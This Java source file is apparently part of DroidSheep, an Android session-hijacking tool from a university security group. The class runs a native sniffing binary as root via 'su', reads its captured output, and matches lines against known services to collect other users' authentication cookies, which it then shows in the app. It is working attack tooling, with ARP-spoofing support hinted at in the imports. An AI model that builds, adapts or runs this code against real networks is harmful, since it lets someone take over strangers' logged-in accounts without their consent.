/*    	ListenThread.java encapsulates the native binary and polls for cookies 
    	Copyright (C) 2011 Andreas Koch <koch.trier@gmail.com>
    	
    	This software was supported by the University of Trier 

	    This program is free software; you can redistribute it and/or modify
	    it under the terms of the GNU General Public License as published by
	    the Free Software Foundation; either version 3 of the License, or
	    (at your option) any later version.
	
	    This program is distributed in the hope that it will be useful,
	    but WITHOUT ANY WARRANTY; without even the implied warranty of
	    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	    GNU General Public License for more details.
	
	    You should have received a copy of the GNU General Public License along
	    with this program; if not, write to the Free Software Foundation, Inc.,
	    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. */


package de.trier.infsec.koch.droidsheep.thread;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.widget.Toast;
import de.trier.infsec.koch.droidsheep.activities.ListenActivity;
import de.trier.infsec.koch.droidsheep.arpspoof.RootAccess;
import de.trier.infsec.koch.droidsheep.auth.Auth;
import de.trier.infsec.koch.droidsheep.auth.AuthHelper;
import de.trier.infsec.koch.droidsheep.helper.SystemHelper;

public class ListenThread extends Thread {

	public static volatile boolean running = false;
	
	public static final String CLEANUP_COMMAND = "killall droidsheep\n";
	
	static Process droidSheepProcess = null;
	static ListenThread singleton = null;
	static InputStream inputStream = null;
	static OutputStream outputStream = null;

	public static String actualOutput = "";

	private Context context = null;
	private Handler handler = null;
	
	private ListenThread (Context c, Handler handler) {
		this.context  = c;
		this.handler = handler;
	}
	
	public static ListenThread getInstance(Context c, Handler handler) {
		if (singleton == null) {
			singleton = new ListenThread(c, handler);
		}
		return singleton;
	}
	
	
	@Override
	public void run() {
		running = true;
		startProcess();
		AuthHelper.init(context);
		
		if (inputStream == null) {
			reset();
			return;
		}
		BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
		String line = null;
//		WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
		while (running) {
			try {
				if (reader.ready()) {
					line = reader.readLine();
					if (line == null) continue;
				} else {
					sleep(200);
					continue;
				}
				
				Log.d("FS", line);
				String[] lst = line.split(";");
				for (String cookieString : lst) {
					Log.d("FS", cookieString);
				}
				actualOutput = line;
				Auth a = AuthHelper.match(line);
				if (a != null) {
					ListenActivity.authList.put(a.getId(), a);
					Message m = handler.obtainMessage();
					Bundle bundle = new Bundle();
					bundle.putString(ListenActivity.BUNDLE_KEY_AUTH, a.getId());
					bundle.putString(ListenActivity.BUNDLE_KEY_TYPE, ListenActivity.BUNDLE_TYPE_NEWAUTH);
					m.setData(bundle);
					handler.sendMessage(m);
				}
			} catch (Exception e) {
				Log.e("FS", "FS", e);
				cleanUp();
				break;
			}
		}
		reset();
	}

	private void startProcess() {
		try {
			if (!RootAccess.isGranted()) {
				Toast.makeText(context, "This software works on rooted phones ONLY! - It will crash if the phone is not rooted!", Toast.LENGTH_LONG).show();
			}
			droidSheepProcess = new ProcessBuilder().command("su").redirectErrorStream(true).start();
			inputStream = droidSheepProcess.getInputStream();
			outputStream = droidSheepProcess.getOutputStream();
			System.out.println((SystemHelper.getDroidSheepBinaryPath(context) + " \n").getBytes("ASCII"));
			outputStream.write((SystemHelper.getDroidSheepBinaryPath(context) + " \n").getBytes("ASCII"));
			outputStream.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void cleanUp() {
		running = false;
		try {
			Process killProcess = new ProcessBuilder().command("su").start();
			killProcess.getOutputStream().write(CLEANUP_COMMAND.getBytes("ASCII"));
			killProcess.getOutputStream().flush();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void reset() {
		cleanUp();
		running = false;
		try {
			Thread.sleep(500); // In case thread is running, we could be reading...
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		if (singleton != null) {
			singleton.interrupt();
		}
		singleton = null;
	}
	
}
